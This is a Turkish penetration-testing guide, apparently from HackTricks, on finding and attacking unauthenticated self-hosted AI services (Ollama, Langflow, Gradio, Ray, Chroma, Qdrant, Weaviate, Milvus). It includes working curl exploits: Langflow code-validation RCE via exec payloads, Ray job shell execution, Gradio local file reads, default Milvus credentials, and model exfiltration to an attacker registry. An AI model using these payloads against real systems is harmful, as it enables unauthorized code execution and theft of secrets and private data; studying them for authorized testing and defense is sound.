# Açığa Çıkmış Self-Hosted AI Hizmetleri

{{#include ../banners/hacktricks-training.md}}

AI özellikleri geliştiren ekipler genellikle kendi model çalıştırıcılarını, agent oluşturucularını, demo arayüzlerini, compute kümelerini ve vektör veritabanlarını çalıştırır. Bu araçların çoğu bir dizüstü bilgisayar veya kapalı bir laboratuvar ağı için tasarlanmıştır; bu nedenle **varsayılan olarak kimlik doğrulamaları yoktur** ya da kimlik doğrulamayı atlayan bir seçenek etkin olarak gelir. Böyle bir hizmet saldırgan tarafından erişilebilir olduğunda etkisi genellikle şu gruplardan birine girer:

- GPU ve modellerin ücretsiz kullanımı, ayrıca özel modellerin çalınması.
- Prompt, belge ve embedding sızıntısı.
- Süreç ortamındaki sırların sızması (LLM sağlayıcı anahtarları, cloud kimlik bilgileri).
- Kod yürütme; çünkü bu API'lerden bazıları kodu **özellik olarak** çalıştırır.

Bu sayfada bu hizmetlerin nasıl bulunacağı ve her API türünde nelerin test edileceği açıklanmaktadır. Self-hosted inference sunucusunu sağlamlaştırma ve llama.cpp `/slots` leak'i için [AI Risk Frameworks](AI-Risk-Frameworks.md#self-hosted-llm-inference-hardening) sayfasına bakın. Kötü amaçlı model dosyaları için [AI Models RCE](AI-Models-RCE.md) sayfasına bakın.

## Parmak İzi Belirleme

Bu istekleri kimlik bilgisi olmadan gönderin. Beklenen alanları içeren bir JSON yanıtı ürünü, çoğu zaman da sürümünü belirler; böylece aşağıdaki kontrollerden hangilerinin geçerli olduğunu anlayabilirsiniz. Portlar, belgelenen varsayılanlar veya resmi çalıştırma örneklerinde kullanılan portlardır.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

| Ürün | Yaygın port | Kimlik doğrulamasız istek | Ürünü tanımlayan |
| --- | --- | --- | --- |
| Ollama | 11434 | `GET /api/version`, `GET /api/tags` | Sürüm JSON'u, yerel model listesi |
| Langflow | 7860 | `GET /api/v1/version` | Langflow sürüm JSON'u |
| Gradio | 7860 | `GET /config` | Gradio sürümünü ve bileşen kimliklerini içeren uygulama yapılandırması |
| Ray dashboard | 8265 | `GET /api/version`, `GET /api/jobs/` | `ray_version`, gönderilen işlerin listesi |
| Chroma | 8000 | `GET /api/v2/heartbeat`, `GET /api/v2/version` | Heartbeat değeri, Chroma sürümü |
| Qdrant | 6333 | `GET /`, `GET /collections` | Qdrant sürümü, koleksiyon listesi |
| Weaviate | - | `GET /v1/meta`, `GET /v1/schema` | Weaviate sürümü, sınıflar |
| Milvus | 19530 | `POST /v2/vectordb/collections/list` | Koleksiyon listesi veya kimlik doğrulama hatası |

Bu hizmetler ayrıca çoğu zaman bir reverse proxy arkasında, yol öneki altında yayımlanır (örneğin `/ollama/` veya `/ray/`). Bu nedenle, JavaScript bundle'larında veya API belgelerinde bulunan tüm önekleri kullanarak istekleri yineleyin.

## Kimlik Doğrulamasız Inference ve Model Yönetimi API'leri

Model çalıştırıcıları genellikle inference rotalarını yönetim rotalarıyla birleştiren tek bir REST API sunar. Ollama buna iyi bir örnektir. Yerleşik kimlik doğrulaması yoktur ve varsayılan olarak `127.0.0.1:11434` adresine bağlanır; `OLLAMA_HOST` bağlanma adresini değiştirir.<sup>[[1]](#references)[[15]](#references)</sup> Resmi Docker image'ı konteyner içinde `OLLAMA_HOST=0.0.0.0:11434` ayarlar, `EXPOSE 11434` bildirir ve `USER` talimatı içermez; bu nedenle sunucu konteyner içinde root olarak çalışır.<sup>[[16]](#references)</sup> `EXPOSE` portu host üzerinde yayımlamaz; dolayısıyla host üzerinden erişilebilirlik dağıtıma bağlıdır. Belgelenmiş `docker run` komutları `-p 11434:11434` kullanır ve bir host IP'si belirtilmediğinde Docker bu eşlemeyi tüm host arayüzlerinde yayımlar.<sup>[[17]](#references)[[18]](#references)</sup>

Her rota grubunun saldırgana sağladıkları:<sup>[[2]](#references)</sup>

| Rotalar | Kimlik doğrulaması olmadığında etkisi |
| --- | --- |
| `GET /api/tags`, `GET /api/ps` | Özel özel modeller de dahil olmak üzere yerel ve yüklenmiş modellerin listesi |
| `POST /api/show` | Modelfile, template ve **system prompt** dahil model ayrıntıları |
| `POST /api/generate`, `/api/chat`, `/api/embed` | Kurbanın donanımında ücretsiz inference |
| `POST /api/pull`, `/api/push` | Sunucunun saldırganın seçtiği bir registry'den model indirmesini veya oraya model yüklemesini sağlama |
| `POST /api/create`, `/api/copy`, `DELETE /api/delete` | Model oluşturma, üzerine yazma veya silme |

```bash
curl -s http://target:11434/api/tags
curl -s http://target:11434/api/show -d '{"model":"<name from /api/tags>"}'
# Outbound fetch to a registry you control: only look for the callback
curl -s http://target:11434/api/pull -d '{"model":"<your-host>/library/test:latest","insecure":true}'
```

Kimlik bilgileri olmadan döndürülen bir model listesi, açığın varlığını zaten kanıtlar. Özel modeller genellikle `/api/show` içinde dahili bir system prompt barındırır. Kendi host’unuza doğru yapılan bir pull, sunucunun saldırganın seçtiği registry’lerden manifest çektiğini kanıtlar. Kendi registry’nize doğru yapılan bir `/api/push`, açığı model hırsızlığına dönüştürür. Gerçek hedeflerde create veya delete route’larını çağırmayın.

Registry pull’ları aynı zamanda bir parser saldırı yüzeyidir; çünkü sunucu blob’ları uzak manifest’teki değerleri kullanarak depolar. Probllama’da (CVE-2024-37032, Ollama 0.1.34’te düzeltildi) manifest’teki `digest`, doğrulanmadan dosya adı olarak kullanılıyordu. Bu nedenle kötü amaçlı bir registry, `../` dizileriyle blobs dizininin dışına dosya yazabiliyordu. Digest’i yerel bir dosyayı gösterecek şekilde ayarlanmış, önceden hazırlanmış bir manifest’i push etmek bu dosyanın saldırganın registry’sine sızmasına yol açtı. Wiz, sunucunun root olarak çalıştığı Docker’da paylaşılan bir kitaplık yazıp bunu `/etc/ld.so.preload` dosyasına ekleyerek ve ardından yeni bir sürecin bu kitaplığı yüklemesi için `/api/chat` çağrısı yaparak RCE elde etti.<sup>[[15]](#references)</sup> Bir runner rastgele registry’lerden pull yapabiliyorsa manifest alanlarını yollara nasıl dönüştürdüğünü kontrol edin.

## Tasarımları gereği kod çalıştıran API’ler

### İş gönderim API’leri

Dağıtık işlem çerçeveleri, kod çalıştırmayı temel özellikleri olarak görür. Dashboard portundaki (8265) Ray Jobs API, bir `entrypoint` shell komutunu kabul eder ve bunu cluster’da çalıştırır.<sup>[[19]](#references)</sup> Oligo ShadowRay araştırması, Jobs API’nin yetkilendirme kullanmadığını ve dashboard’un `0.0.0.0` adresine bağlandığını bildiriyor. Eşleşen CVE-2023-48022 tartışmalıdır; çünkü Ray’in yalnızca kontrollü bir ağ içinde çalışması beklenir.<sup>[[20]](#references)</sup> Ray, 2.52.0 sürümünde isteğe bağlı token kimlik doğrulaması (`RAY_AUTH_MODE=token`) ekledi. Ray 2.59, `ray.init()` ile başlatılan yerel cluster’larda bunu varsayılan olarak etkinleştirir; kullanılabilir bir token olmadan `ray start --head` komutu hâlâ kimlik doğrulaması olmadan başlatılabilir. Ray, 2.61 için varsayılan kimlik doğrulamasının daha geniş kapsamlı kullanıma sunulacağını belgeliyor. Bu nedenle dashboard’un açık olduğunu varsaymak yerine dağıtılan sürümü ve başlatma modunu kontrol edin.<sup>[[21]](#references)</sup>

```bash
curl -s http://target:8265/api/version
curl -s http://target:8265/api/jobs/   # existing entrypoints often contain secrets
# Only if the scope allows code execution: DNS callback as proof
curl -s -X POST http://target:8265/api/jobs/ -H 'Content-Type: application/json' \
  -d '{"entrypoint":"nslookup <oast-host>","runtime_env":{}}'
```

Bu tür dashboard'larda eski sürümlerde yoklanmaya değer yardımcı route'lar da bulunur. Ray 2.8.1'den önce `/log_proxy?url=` herhangi bir HTTP(S) URL'sini getiriyordu (cloud metadata'ya SSRF) ve `/api/v0/logs/file` rastgele bir `filename` yolunu kabul ediyordu; her ikisi de kimlik doğrulaması olmadan çalışıyordu.<sup>[[8]](#references)</sup>

### Fonksiyon tanımlarını çalıştıran kod "doğrulama" endpoint'leri

Özel Python bileşenlerini kabul eden agent builder'lar bazen kodu `ast` ile ayrıştırıp yalnızca fonksiyon tanımlarını `exec()` ile çalıştırarak kodu "doğrular". Bu güvenli değildir. Python, fonksiyonu tanımlarken **decorator'ları ve varsayılan argüman değerlerini değerlendirir**, bu yüzden fonksiyon gövdesi hiç çalışmasa bile bu kısımlara yerleştirilen kod çalışır. Langflow'un `POST /api/v1/validate/code` endpoint'i bu şekilde çalışıyordu ve 1.3.0'dan önce kimlik doğrulaması yoktu (CVE-2025-3248). Komut çıktısını içeren bir exception yükseltmek, endpoint'in yanıtında çıktıyı döndürmesini sağlar:<sup>[[22]](#references)</sup>

```bash
# Decorator variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code": "@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")\ndef foo():\n  pass"}'
# Default-argument variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code":"def foo(cmd=exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")):\n  pass"}'
```

Kullanıcı kodunu derleyen, lint uygulayan veya "kontrol eden" tüm endpoint'lerde bu kalıbı test edin ve kanıt olarak tercihen bir DNS callback kullanın.

### Otomatik giriş ve varsayılan superuser token rotaları

Tek kullanıcılı araçlarda genellikle her ziyaretçiyi yönetici olarak oturum açtıran bir kısayol bulunur. Langflow'da `AUTO_LOGIN` etkinleştirildiğinde `GET /api/v1/auto_login`, varsayılan superuser için token'ları tüm çağıranlara döndürür. Devre dışı bırakıldığında ise rota `Auto login is disabled.` yanıtını verir.<sup>[[23]](#references)</sup> Langflow OSS 1.0.0 ile 1.10.0 arasında bu özellik varsayılan olarak etkindi (CVE-2026-9103). Bunu yukarıdaki kimlik doğrulamalı kod doğrulama rotasıyla zincirlemek, kimlik doğrulamasız RCE'yi yeniden mümkün kılar (CVE-2026-9198, Harish Kolla tarafından raporlanmıştır).<sup>[[24]](#references)[[25]](#references)[[33]](#references)</sup> Mevcut resmi sürüm paketleri ve Docker image'ları otomatik girişi devre dışı bırakır ve superuser parolası gerektirir, ancak geliştirme dallarında bu özellik etkin kalır.<sup>[[3]](#references)</sup>

```bash
TOKEN=$(curl -s http://target:7860/api/v1/auto_login | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" http://target:7860/api/v1/users/whoami
```

Kod çalıştırma olmadan bile superuser token, her flow'a ve depolanan provider kimlik bilgilerine erişim sağlar. Otomatik testlerdeki ilgili bir ön koşul kontrolü için bkz. [Web Black-Box AI Pentester Bots](Web-Black-Box-AI-Pentester-Bots.md).

## ML demo UI'larında dosya sunma ve RPC rotaları

ML demo framework'leri, yüklenen ve oluşturulan dosyaları genel bir rota üzerinden sunar ve frontend'in sunucu tarafındaki component yardımcılarını çağırmasına olanak tanır. Gradio bunun için `/config`, `/upload` ve `/file=<path>` rotalarını sunar.<sup>[[5]](#references)</sup> Benzer framework'lerde test etmeye değer iki örüntü şunlardır:

- **Bir upload alt dizininden Traversal:** Dosya rotası yalnızca yolun geçici klasörün içinde başladığını kontrol ediyorsa, bir alt dizin oluşturmak için dosya yükleyin, ardından `../` veya `%2e%2e%2f` ile bu dizinin dışına çıkın. Gradio 4.0 ile 4.10 arasındaki sürümler (CVE-2023-51449) bu şekilde savunmasızdı.<sup>[[26]](#references)[[27]](#references)</sup> İstemcinin yolu normalleştirmemesi için isteği `curl --path-as-is` ile gönderin.
- **Keyfi yöntem çağrımı:** Kullanıcı girdisiyle `getattr(component, fn_name)` çağıran bir endpoint, saldırganın dahili yardımcıları çağırmasına olanak tanır. Gradio'nun `/component_server` rotası 4.13.0 öncesinde bunu yapıyordu. 4.3 ile 4.12 arasında `move_resource_to_block_cache`, herhangi bir yerel dosyayı cache'e kopyalayabiliyordu; dosya daha sonra `/file=` üzerinden indirilebiliyordu. 3.47 ile 3.50.2 arasında ise başka yardımcılar dosya okuma ve tam okuma SSRF sağlıyordu.<sup>[[26]](#references)[[28]](#references)</sup> Düzeltilmiş bir sunucu, sunucu işlevi olarak işaretlenmemiş yardımcılar için `Function not found.` yanıtını verir.<sup>[[28]](#references)</sup>

```bash
curl -s http://target:7860/config | jq '.components[].id'
curl -s http://target:7860/component_server -H 'Content-Type: application/json' \
  -d '{"component_id":"1","data":"/etc/hostname","fn_name":"move_resource_to_block_cache","session_hash":"aaa"}'
curl -s 'http://target:7860/file=<returned_path>'
```

Hugging Face Spaces'te Space secrets ortam değişkenleridir; bu nedenle `/proc/self/environ` en değerli dosyadır. Horizon3 bu dosyayı bir HTTP `Range` header'ı kullanarak okudu.<sup>[[26]](#references)</sup>

## RAG tarafından kullanılan vector database'ler

RAG, özgün belgelerin parçalarını, bunların embedding'lerini ve metadata'larını bir vector database'de saklar; asistan da en üst sıradaki sonuçları prompt'una ekler. Bu nedenle okuma erişimi **özel belgelerin düz metnini** sızdırır. Yazma erişimi, saldırganın daha sonra diğer kullanıcıların prompt'larına alınan parçaları eklemesine olanak tanır; bu, kalıcı dolaylı prompt injection'dır ([AI Prompts](AI-Prompts.md#third-party-or-indirect-prompt-injection) bölümüne bakın).

Self-hosted vector database'lerde authentication'ın yapılandırılıp yapılandırılmadığını veya anonymous access'in etkin olup olmadığını kontrol edin:

- **Qdrant**: self-deployed instance'lar tüm interface'lerde authentication olmadan dinler. Yapılandırıldığında key, `api-key` header'ına veya `Authorization: Bearer` olarak eklenir. Salt okunur ve collection başına key'ler olabilir.<sup>[[11]](#references)</sup>
- **Chroma**: authentication varsayılan olarak devre dışıdır. Token auth, `Authorization` veya `X-Chroma-Token` kullanır.<sup>[[29]](#references)</sup>
- **Weaviate**: anonymous access etkinleştirildiğinde, credentials olmadan gelen istekler `user: anonymous` olarak authenticated olur ve bu kullanıcının sahip olduğu izinleri alır.<sup>[[30]](#references)</sup>
- **Milvus**: `common.security.authorizationEnabled` değeri `true` olmadıkça authentication kapalıdır. Açık olduğunda, varsayılan `root` kullanıcısının parolası `Milvus` olur ve token biçimi `username:password` şeklindedir.<sup>[[31]](#references)[[14]](#references)</sup>

Credentials olmadan özel veriler içeren bir yanıt, verilerin açığa çıktığını gösterir. Authentication etkinse, değiştirilmemiş varsayılan hesapları ayrıca değerlendirin:<sup>[[12]](#references)[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
curl -s http://target:6333/collections
curl -s -X POST http://target:6333/collections/<name>/points/scroll -H 'Content-Type: application/json' -d '{"limit":3,"with_payload":true}'
curl -s http://target:8000/api/v2/tenants/default_tenant/databases/default_database/collections
curl -s 'http://target:<weaviate-port>/v1/objects?limit=3'
curl -s -X POST http://target:19530/v2/vectordb/collections/list -H 'Authorization: Bearer root:Milvus' -H 'Content-Type: application/json' -d '{}'
```

Payload'ların belge metni, kullanıcı tanımlayıcıları veya tenant adları içerip içermediğini kontrol edin. Production verilerini kirletmeden yazma erişimini göstermek için, kapsam izin veriyorsa, adı açıkça belli olan boş bir collection oluşturup hemen silin.

Bu sunucularda kimlik doğrulama da çok geç yapılabilir. Chroma'nın Python FastAPI sunucusunda (1.0.0'dan en az 1.5.8'e kadar, CVE-2026-45829), collection oluşturma rotası kimlik doğrulama kontrolünden önce istemcinin sağladığı embedding function'ı oluşturuyordu. `trust_remote_code: true` ile saldırganın kontrolündeki bir Hugging Face modelini referans alan yapılandırma, istek reddedilse bile saldırganın kodunu çalıştırıyordu. Rust frontend etkilenmedi.<sup>[[32]](#references)</sup> Bir istek model veya plugin yapılandırması içerdiğinde, kimlik bilgileri olmadan test edin ve model deponuza giden bir outbound fetch olup olmadığını izleyin.

## References

- [1] [Ollama SSS](https://github.com/ollama/ollama/blob/main/docs/faq.mdx)
- [2] [Ollama API belgeleri](https://github.com/ollama/ollama/blob/main/docs/api.md)
- [3] [Langflow README](https://github.com/langflow-ai/langflow/blob/main/README.md)
- [4] [Langflow kaynak kodu - API v1 endpoint'leri](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/endpoints.py)
- [5] [Gradio kaynak kodu - routes.py](https://github.com/gradio-app/gradio/blob/main/gradio/routes.py)
- [6] [Gradio kaynak kodu - http_server.py](https://github.com/gradio-app/gradio/blob/main/gradio/http_server.py)
- [7] [Ray kaynak kodu - job_head.py](https://github.com/ray-project/ray/blob/master/python/ray/dashboard/modules/job/job_head.py)
- [8] [Bishop Fox - Ray, 2.6.3 ve 2.8.0 sürümleri](https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0)
- [9] [Chroma kaynak kodu - Python client varsayılanları](https://github.com/chroma-core/chroma/blob/main/chromadb/__init__.py)
- [10] [Chroma kaynak kodu - FastAPI sunucusu rotaları](https://github.com/chroma-core/chroma/blob/main/chromadb/server/fastapi/__init__.py)
- [11] [Qdrant - Güvenlik](https://qdrant.tech/documentation/security/)
- [12] [Qdrant OpenAPI spesifikasyonu](https://github.com/qdrant/qdrant/blob/master/docs/redoc/master/openapi.json)
- [13] [Weaviate OpenAPI spesifikasyonu](https://github.com/weaviate/weaviate/blob/main/openapi-specs/schema.json)
- [14] [Milvus - Milvus sunucusuna bağlanma](https://milvus.io/docs/connect-to-milvus-server.md)
- [15] [Wiz - Probllama: Ollama Remote Code Execution açığı (CVE-2024-37032)](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032)
- [16] [Ollama Dockerfile](https://github.com/ollama/ollama/blob/main/Dockerfile)
- [17] [Ollama Docker belgeleri](https://github.com/ollama/ollama/blob/main/docs/docker.mdx)
- [18] [Docker - Portları yayımlama ve dışarı açma](https://docs.docker.com/get-started/docker-concepts/running-containers/publishing-ports/)
- [19] [Ray Jobs REST API](https://docs.ray.io/en/latest/cluster/running-applications/job-submission/rest.html)
- [20] [Oligo - ShadowRay: AI iş yüklerini hedef alan ve gerçek saldırılarda istismar edilen bilinen ilk saldırı kampanyası](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild)
- [21] [Ray token kimlik doğrulaması](https://docs.ray.io/en/latest/ray-security/token-auth.html)
- [22] [Horizon3.ai - Her hızda güvensiz: Langflow AI'da kimlik doğrulamasız RCE için Python Exec'in kötüye kullanılması](https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/)
- [23] [Langflow kaynak kodu - login router](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/login.py)
- [24] [NVD - CVE-2026-9103](https://nvd.nist.gov/vuln/detail/CVE-2026-9103)
- [25] [NVD - CVE-2026-9198](https://nvd.nist.gov/vuln/detail/CVE-2026-9198)
- [26] [Horizon3.ai - Hugging Face Spaces'ten sırları çalmak için Gradio'daki dosya okuma açıklarından yararlanma](https://horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/)
- [27] [Gradio güvenlik bildirimi GHSA-6qm2-wpxq-7qh2](https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2)
- [28] [Gradio `/component_server` için düzeltme commit'i](https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2)
- [29] [Chroma Cookbook - Chroma yerel kimlik doğrulaması](https://cookbook.chromadb.dev/security/legacy-auth/)
- [30] [Weaviate - Kimlik doğrulama](https://docs.weaviate.io/weaviate/configuration/authentication)
- [31] [Milvus - Kullanıcı erişiminin kimliğini doğrulama](https://milvus.io/docs/authenticate.md)
- [32] [HiddenLayer - ChromaToast: Kimlik doğrulaması öncesinde sunuldu](https://www.hiddenlayer.com/research/chromatoast-served-pre-auth)
- [33] [IBM Güvenlik Bülteni - Otomatik oturum açma atlatma ve kod doğrulama yoluyla kimlik doğrulamasız Remote Code Execution (CVE-2026-9198)](https://www.ibm.com/support/pages/node/7278927)
{{#include ../banners/hacktricks-training.md}}
